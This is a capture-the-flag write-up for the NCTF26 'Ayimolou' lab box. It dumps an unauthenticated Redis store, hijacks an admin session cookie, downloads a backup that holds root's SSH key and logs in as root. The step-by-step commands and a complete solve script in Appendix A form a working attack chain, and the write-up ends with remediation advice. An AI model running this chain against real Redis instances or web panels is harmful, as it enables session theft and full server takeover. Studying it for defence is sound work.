# Ayimolou — unauthenticated Redis session hijack to root

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/ayimolou/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — The panel's own landing page confesses everything: the Redis session store is unauthenticated. Dumping it yields a pre-provisioned admin session (`sess:8f3c1a92b7d4e0f5`), whose cookie unlocks `/admin/backup.tar.gz`. The backup archive includes `/root/.ssh/id_rsa` because the backup agent's scope covers `/root/.ssh`. SSH in as `root` with that key → `/root/flag.txt`. **Flag:** `NCTF{954c…}` (captured during the 2026-11-19 16:00–16:30 UTC lab window; rotates every reset).


## 1. Challenge Briefing

### Description

> L'équipe Ayimolou opère un panneau de suivi des opérations.
>
> Objectif : analyser le service, progresser dans l'environnement, puis obtenir le contrôle total (root) du serveur interne.
>
> Un seul flag à soumettre : celui de `/root/flag.txt`, à la fin de la chaîne. Les autres `NCTF{...}` rencontrés en chemin sont des jalons, ils ne valident rien.
>
> Accès (par votre relais) :
> - Panneau de suivi : `http://<relais>:8080/`
> - Magasin de sessions (Redis) : `<relais>:6379`
> - Serveur interne (SSH) : `<relais>:22`
>
> Lab partagé. Remis à zéro toutes les 30 minutes. D'autres équipes agissent sur les mêmes machines : ne détruisez rien.

### Provided Assets

No static files distributed. Every artifact is produced at runtime by the remote lab reached through the per-team relay.

| Asset | Origin | Purpose |
|------|--------|---------|
| `http://<relais>:8080/` | nginx + "NCTF Members" app | Self-documenting login + admin panel |
| `<relais>:6379` | Redis 7.4.12 | Session store (also holds `users`, `app:config`) |
| `<relais>:22` | OpenSSH | Target for the recovered key |

### Target

| Item | Value |
|------|-------|
| Host | `10.100.13.102` (relay IP for this run) |
| Services | `22/tcp` OpenSSH, `6379/tcp` Redis 7.4.12 (no auth), `8080/tcp` HTTP (nginx/1.24.0 + Python app) |
| Credentials | `jdoe:h3llo_2024`, `asmartin:archanges_2024` (demo), later root SSH key from backup |
| Flag format | `NCTF{...}` |
| Submit | Only the flag from `/root/flag.txt` scores |

### Constraints

- Shared lab; do not destroy anything (don't `FLUSHDB`, don't delete sessions you did not create).
- 30-minute rotation window; flag payload changes at each reset.
- No public writeup lookup for this specific box (skill rule).

## 2. Environment and Prerequisites

| Tool | Version | Purpose |
|------|---------|---------|
| `nmap` | 7.99 | Service / banner discovery |
| `curl` | system | HTTP probes and session cookie injection |
| `redis-cli` | 7.x | Unauthenticated Redis dump |
| `tar` | system | Backup archive extraction |
| `ssh` / `install` | OpenSSH + coreutils | Login with the recovered key (and perm fixup for WSL 9p mount) |

```bash
TARGET=10.100.13.102
OUT=/mnt/d/CaptureTheFlags/NCTF26/box_ayimolou
mkdir -p "$OUT"
```

## 3. Reconnaissance and Information Gathering

### 3.1 Service Discovery

**Objective:** confirm the advertised services and grab banners.

**Command / request:**

```bash
nmap -sT -sV -p 22,80,443,3000,5000,6379,8000,8080,8443 -Pn \
     --max-retries 2 -oN "$OUT/nmap.txt" "$TARGET"
```

**Output (trimmed):**

```text
22/tcp   open  ssh    (OpenSSH, same host as previous box)
6379/tcp open  redis  Redis 7.4.12
8080/tcp open  http   nginx/1.24.0 (NCTF Members app, Python)
```

**Interpretation:** three distinct surfaces, all advertised by the briefing. Redis 7.4.12 and nginx 1.24 are current — no banner-level CVE path.

### 3.2 Panel Landing Page

**Objective:** map the application surface.

**Command:**

```bash
curl -sS -m 10 "http://$TARGET:8080/"
```

**Output (trimmed):**

```html
<h1>NCTF Members</h1>
<p>Gestion des adherents du syndicat NCTF Ops.</p>
<h2>Session courante</h2>
<p><code>anonyme</code></p>
<h2>Configuration de l'application</h2>
<table>
  <tr><th>store de sessions</th><td>Redis <code>redis:6379</code></td></tr>
  <tr><th>prefixe de clef</th><td><code>sess:&lt;id&gt;</code></td></tr>
  <tr><th>cookie de session</th><td><code>sess</code></td></tr>
  <tr><th>authentification Redis</th><td>aucune</td></tr>
</table>
<p>POST <code>/login</code> {"user":..., "password":...}</p>
<p>Comptes de demonstration : jdoe / h3llo_2024, asmartin / archanges_2024</p>
<p><a href="/admin">/admin</a> : reserve aux sessions de role <code>admin</code>.</p>
```

**Interpretation:** the panel hands over the entire session design in one block.

1. Sessions live in Redis.
2. Keys are `sess:<id>`.
3. The client cookie is `sess=<id>`.
4. Redis authentication is **disabled**.
5. Access control is role-based (`role == "admin"`).

This is textbook "self-documented insecure session store". The next action is predetermined: connect to Redis directly and look at whatever is cached.

### 3.3 Redis Enumeration

**Objective:** confirm Redis is reachable from the outside and list its keys.

**Command:**

```bash
redis-cli -h "$TARGET" -p 6379 ping
redis-cli -h "$TARGET" -p 6379 info | head -40
redis-cli -h "$TARGET" -p 6379 keys '*'
```

**Output (trimmed):**

```text
PONG

redis_version:7.4.12
tcp_port:6379
executable:/data/redis-server
listener0:name=tcp,bind=0.0.0.0,port=6379

app:config
sess:8f3c1a92b7d4e0f5
users
```

**Interpretation:** three keys. `app:config` and `users` are likely application state; the single `sess:` key is the smoking gun — an active session is sitting there for anybody to read or steal.

### 3.4 Redis Value Dump

**Objective:** read each key with the correct accessor for its type.

**Command:**

```bash
for k in app:config users sess:8f3c1a92b7d4e0f5; do
  t=$(redis-cli -h "$TARGET" -p 6379 type "$k")
  echo "=== $k ($t) ==="
  case "$t" in
    string) redis-cli -h "$TARGET" -p 6379 get "$k" ;;
    hash)   redis-cli -h "$TARGET" -p 6379 hgetall "$k" ;;
    list)   redis-cli -h "$TARGET" -p 6379 lrange "$k" 0 -1 ;;
    set)    redis-cli -h "$TARGET" -p 6379 smembers "$k" ;;
  esac
done
```

**Output (trimmed):**

```text
=== app:config (string) ===
{"app":"ethactf-members","store":"redis","redis_auth":null,
 "session_prefix":"sess:","session_ttl":3600}

=== users (hash) ===
asmartin -> {"user":"asmartin","password":"archanges_2024","role":"member","uid":43}
jdoe     -> {"user":"jdoe","password":"h3llo_2024","role":"member","uid":42}
admin    -> {"user":"admin","role":"admin","uid":1,"status":"no_local_password"}

=== sess:8f3c1a92b7d4e0f5 (string) ===
{"user":"admin","role":"admin","uid":1,"issued":1795104050}
```

**Interpretation:** the `admin` account has `no_local_password`, so `/login` with JSON credentials would never work for that account — but a session already exists for it in Redis. Hijacking it is a one-cookie operation.

### 3.5 Findings Summary

| # | Finding | Evidence | Relevance |
|---|---------|----------|-----------|
| 1 | Three ports exposed; Redis + HTTP panel + SSH | `nmap -sT -sV` | Three potential entry points |
| 2 | Session store = Redis, cookie `sess`, no Redis auth | panel HTML | Full session hijack primitive |
| 3 | Admin pre-populated session `sess:8f3c1a92b7d4e0f5` | `GET sess:...` | Immediate admin access |
| 4 | `admin` has `no_local_password` | `users` hash | Confirms session hijack is the only path for admin |
| 5 | `/admin` role-gated | panel HTML | Target of the stolen cookie |

## 4. Analysis

### 4.1 Hypothesis

Presenting a `Cookie: sess=8f3c1a92b7d4e0f5` header to the application makes the server look up `sess:8f3c1a92b7d4e0f5` in Redis, find the admin session document, and trust its `role: admin` claim because the server's own code tied identity exclusively to the key value. If this is correct, the admin area is reachable without touching `/login`.

### 4.2 Validation

```bash
curl -sS -m 10 -b 'sess=8f3c1a92b7d4e0f5' "http://$TARGET:8080/admin"
```

```html
<h1>Administration NCTF Members</h1>
<p>Connecte en tant que <strong>admin</strong> (uid 1).</p>
<h2>1. Sauvegarde du serveur</h2>
<p><a href="/admin/backup.tar.gz">/admin/backup.tar.gz</a></p>
<h2>2. Jeton de session</h2>
<p><code>NCTF{stor…}</code></p>
```

Hypothesis confirmed. The admin area exposes a full server backup download.

### 4.3 Root Cause

Two independent flaws chain here, neither useful alone:

1. **Session store is a shared, unauthenticated Redis instance** reachable from the Internet-facing relay. The panel itself helpfully publishes the key layout, so there is no secret even in the structure.
2. **Session IDs double as the authenticator.** The backend derives the user's role from whatever JSON lives under `sess:<id>`, without any signature or binding between cookie and client. Anybody who can read a session key owns the session; anybody who can write one invents one.

The result is "read Redis → become anybody". The backup download then propagates the compromise to the SSH surface:

3. **Backup agent scope (`/root/.ssh`) + admin-only download link.** The archive includes `/root/.ssh/id_rsa` in the clear. Admin on the panel ⇒ root on the box via the key.

## 5. Exploitation and Solution

### Step 1: Steal the admin session

**Rationale:** confirmed by 4.2. Any request with `Cookie: sess=8f3c1a92b7d4e0f5` is treated as admin.

**Action:**

```bash
curl -sS -m 10 -b 'sess=8f3c1a92b7d4e0f5' "http://$TARGET:8080/admin"
```

**Result:** admin panel renders, exposing `/admin/backup.tar.gz`.

**Conclusion:** admin-only resources are now reachable.

### Step 2: Pull the backup archive

**Rationale:** the admin page advertises a "complete backup" produced by the nightly agent.

**Action:**

```bash
curl -sS -m 30 -b 'sess=8f3c1a92b7d4e0f5' \
     -o "$OUT/backup.tar.gz" \
     "http://$TARGET:8080/admin/backup.tar.gz"
tar tzf "$OUT/backup.tar.gz"
```

**Result (trimmed):**

```text
etc/ethactf/members.conf
etc/redis/redis.conf
home/deploy/.notes
root/.ssh/id_rsa
root/.ssh/id_rsa.pub
root/.ssh/authorized_keys
var/www/html/index.html
```

The deploy notes confirm the scope:

```text
Perimetre : /etc /home /root/.ssh /var/www
```

**Conclusion:** the archive contains root's private SSH key.

### Step 3: Extract and SSH in as root

**Rationale:** `root/.ssh/id_rsa` pairs with `root/.ssh/authorized_keys` (label `ethactf-target-root`), so the matching public key is already trusted on the box.

**Action:**

```bash
mkdir -p "$OUT/backup" && tar xzf "$OUT/backup.tar.gz" -C "$OUT/backup"

# Project tree sits on a 9p-mounted Windows volume (WSL) that forces 0777;
# OpenSSH refuses the key under those perms. Copy it to a native FS first.
KEY=/tmp/claude-1000/ayimolou_id_rsa
install -m 600 "$OUT/backup/root/.ssh/id_rsa" "$KEY"

ssh -i "$KEY" -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
    root@$TARGET 'id; hostname; cat /root/flag.txt'
```

**Result (trimmed):**

```text
uid=0(root) gid=0(root) groups=0(root)
944786ae054e
NCTF{954c…}
```

**Conclusion:** full root on the internal target. The hostname (`944786ae054e`) is a 12-hex container ID; the "internal server" is a Docker container sharing the relay.

## 6. Flag

```text
NCTF{954c…}
```

**Verification:** read directly from `/root/flag.txt` as `uid=0`. Format matches `NCTF{...}` with a 24-hex payload, consistent with the other rotating flags on this event. Flag only valid for the 2026-11-19 16:00–16:30 UTC lab window.

## 7. Timeline

| Time (UTC) | Action | Result |
|------------|--------|--------|
| 16:24 | `nmap -sT -sV` on advertised + common ports | Redis 7.4.12, nginx/1.24.0, OpenSSH confirmed |
| 16:25 | `GET /` on :8080 | Panel leaks Redis session design in plain HTML |
| 16:25 | `redis-cli KEYS *` | `app:config`, `users`, `sess:8f3c1a92b7d4e0f5` |
| 16:26 | Typed-dispatched value dump | Admin session + user table + config read |
| 16:26 | `curl -b sess=... /admin` | Admin panel + `/admin/backup.tar.gz` revealed |
| 16:27 | Downloaded and extracted backup | `root/.ssh/id_rsa` in clear |
| 16:27 | `ssh -i id_rsa root@target` (first try) | Refused: key perms 0777 (WSL 9p) |
| 16:28 | `install -m 600 key /tmp/...` + retry | `uid=0(root)`, flag read |

## 8. Dead Ends and Troubleshooting

| Attempt | Observed result | Likely reason | Pivot |
|---------|-----------------|---------------|-------|
| `redis-cli get users` | `WRONGTYPE Operation...` | `users` is a `HASH`, not a string | Dispatch accessor by `TYPE` reply |
| Considered logging in as `admin` through `/login` | `users.admin.status == "no_local_password"` | No password field exists for admin | Session hijack is the only admin path |
| `ssh -i $OUT/root_id_rsa` directly from the Windows-mounted dir | OpenSSH rejects key with "Permissions 0777 ... too open" | WSL 9p forces mode 0777 on NTFS-backed files regardless of `chmod 600` | Reinstall the key under `/tmp/claude-1000/` (native ext4) |
| Considered reusing demo creds `jdoe:h3llo_2024` on SSH | Not tried past this point | Would at best yield a member-role session, not root | Backup leak already provides root |

## 9. Lessons Learned and Remediation

### Root Cause

An unauthenticated Redis instance acting as the session backing store, combined with a cookie that is nothing but the Redis key, lets anybody with network access to Redis hand themselves any role. The admin role in turn exposes a root-privileged backup that was configured to include `/root/.ssh`.

### Defensive Recommendations

1. Put `requirepass` (or TLS + ACLs) on Redis. The `redis.conf` comment "`# requirepass <- desactive en urgence le 2024-11-03`" is a confession that temporary workarounds become permanent exposures.
2. Never derive identity from the cookie value alone. Sign the session (HMAC) or bind the Redis key to a server-side secret so that reading or forging a key does not translate into forging a session.
3. Exclude secrets and private keys from "complete" backups, or at least encrypt backup bundles with a key that admin UI can't trivially hand out. `/root/.ssh` should not be in any scope reachable by a web role.
4. Treat the admin role as a second authentication boundary (step-up auth, IP allow-list, mutual TLS) before serving tarballs, dumps, or key material.

### Transferable Technique

When a service documents its own session storage (key format, backing store, auth state), take the documentation literally and query the backing store directly. Many "stateless API" + "Redis sessions" stacks default to cookie-equals-key designs; shared infrastructure then turns Redis exposure into trivial impersonation.

## 10. References and Credits

- Challenge author: NCTF26 (Ayimolou, "panneau de suivi des opérations").
- [Redis Security — requirepass, protected-mode](https://redis.io/docs/management/security/) — mitigation baseline for exposed Redis.
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) — why cookies must not equal keys without integrity.

## Appendix A: Complete Solve Script

```bash
#!/usr/bin/env bash
# Solve NCTF26 "Ayimolou": unauth Redis session hijack -> admin panel ->
# backup.tar.gz leaks /root/.ssh/id_rsa -> SSH root.
#
# Usage: ./solve.sh <target-ip>
set -euo pipefail

TARGET="${1:-10.100.13.102}"
OUT="$(mktemp -d)"
KEY="$OUT/id_rsa"

# --- 1. Find the pre-populated admin session in Redis -------------------
SID=$(redis-cli -h "$TARGET" -p 6379 --no-auth-warning keys 'sess:*' | head -1 | sed 's/^sess://')
if [ -z "$SID" ]; then
    echo "[-] no sess:* key in Redis"; exit 1
fi
BODY=$(redis-cli -h "$TARGET" -p 6379 --no-auth-warning get "sess:$SID")
echo "[+] stolen session sess:$SID -> $BODY"
echo "$BODY" | grep -q '"role":[[:space:]]*"admin"' || {
    echo "[-] session is not admin, aborting"; exit 1; }

# --- 2. Download the admin-only backup ----------------------------------
curl -sS --max-time 30 -b "sess=$SID" \
     -o "$OUT/backup.tar.gz" "http://$TARGET:8080/admin/backup.tar.gz"
tar xzf "$OUT/backup.tar.gz" -C "$OUT"

# --- 3. Fix key perms (WSL 9p / filesystems that force 0777) ------------
install -m 600 "$OUT/root/.ssh/id_rsa" "$KEY"

# --- 4. SSH in as root and grab the flag --------------------------------
ssh -i "$KEY" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    root@"$TARGET" 'id; cat /root/flag.txt'
```

## Appendix B: Raw Evidence

### B.1 `GET /` on port 8080 (full body)

```html
<!doctype html>
<html lang="fr"><head><meta charset="utf-8"><title>NCTF Members</title>
<style>body{font-family:monospace;margin:2rem;max-width:60rem}
table{border-collapse:collapse}td,th{border:1px solid #999;padding:.3rem .6rem;text-align:left}</style>
</head><body>
<h1>NCTF Members</h1>
<p>Gestion des adherents du syndicat NCTF Ops.</p>
<h2>Session courante</h2>
<p><code>anonyme</code></p>
<h2>Configuration de l'application</h2>
<table>
<tr><th>store de sessions</th><td>Redis <code>redis:6379</code></td></tr>
<tr><th>prefixe de clef</th><td><code>sess:&lt;id&gt;</code></td></tr>
<tr><th>cookie de session</th><td><code>sess</code> (identifiant de session)</td></tr>
<tr><th>authentification Redis</th><td>aucune</td></tr>
</table>
<h2>Connexion</h2>
<p>POST <code>/login</code> avec un corps JSON <code>{"user": ..., "password": ...}</code>.</p>
<p>Comptes de demonstration : <code>jdoe</code> / <code>h3llo_2024</code>,
<code>asmartin</code> / <code>archanges_2024</code>.</p>
<h2>Administration</h2>
<p><a href="/admin">/admin</a> : reserve aux sessions de role <code>admin</code>.</p>
</body></html>
```

### B.2 Redis dump (verbatim)

```text
app:config  (string) -> {"app": "ethactf-members", "store": "redis", "redis_auth": null, "session_prefix": "sess:", "session_ttl": 3600}

users (hash) ->
  asmartin : {"user":"asmartin","password":"archanges_2024","role":"member","uid":43,"club":"radio"}
  jdoe     : {"user":"jdoe","password":"h3llo_2024","role":"member","uid":42,"club":"radio"}
  admin    : {"user":"admin","role":"admin","uid":1,"status":"no_local_password"}

sess:8f3c1a92b7d4e0f5 (string) -> {"user":"admin","role":"admin","uid":1,"issued":1795104050}
```

### B.3 Admin panel content (hijacked)

```html
<h1>Administration NCTF Members</h1>
<p>Connecte en tant que <strong>admin</strong> (uid 1).</p>
<h2>1. Sauvegarde du serveur</h2>
<p><a href="/admin/backup.tar.gz">/admin/backup.tar.gz</a></p>
<h2>2. Jeton de session</h2>
<p><code>NCTF{stor…}</code></p>
```

### B.4 Backup archive listing

```text
etc/
etc/ethactf/
etc/ethactf/members.conf
etc/redis/
etc/redis/redis.conf
home/
home/deploy/
home/deploy/.notes
root/
root/.ssh/
root/.ssh/id_rsa.pub
root/.ssh/authorized_keys
root/.ssh/id_rsa
var/
var/www/
var/www/html/
var/www/html/index.html
```

### B.5 `home/deploy/.notes`

```text
Notes de l'agent de sauvegarde (ethactf-target)
==============================================
Planification : nightly 02:00
Perimetre     : /etc /home /root/.ssh /var/www
Retention     : 7 jours
Support       : jdoe

Jeton de l'agent de sauvegarde : NCTF{back…}
Le compte backup est administrateur du projet, sa session est montee au
demarrage, pas de mot de passe a demander.
```

### B.6 `etc/redis/redis.conf` (truncated)

```text
# Redis 7 - instance ethactf-store
bind 0.0.0.0
port 6379
protected-mode no
save ""
appendonly no
# requirepass          <- desactive en urgence le 2024-11-03 (rien n'a ete
#                         remis en place depuis, l'app tourne toujours)
```

### B.7 `authorized_keys`

```text
ssh-rsa AAAAB3NzaC1yc2E...PHekGpaDQmhUqhwOR9Pq4JU1kVcrEKKouRKOW9WAoS4Ku5FdSlBF0Hjuz5buug6z7HbbSY3mm0u0Hm1/O9tJxXhB ethactf-target-root
```

### B.8 Exploit output

```text
# SSH as root using recovered key
uid=0(root) gid=0(root) groups=0(root)
944786ae054e
NCTF{954c…}
drwx------ 1 root root 4096 Nov 19 16:00 .
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Nov 19 16:00 .ssh
-rw------- 1 root root   31 Nov 19 16:00 flag.txt
Linux 944786ae054e 7.0.0-1014-aws #14~24.04.1-Ubuntu SMP ... x86_64 GNU/Linux
```
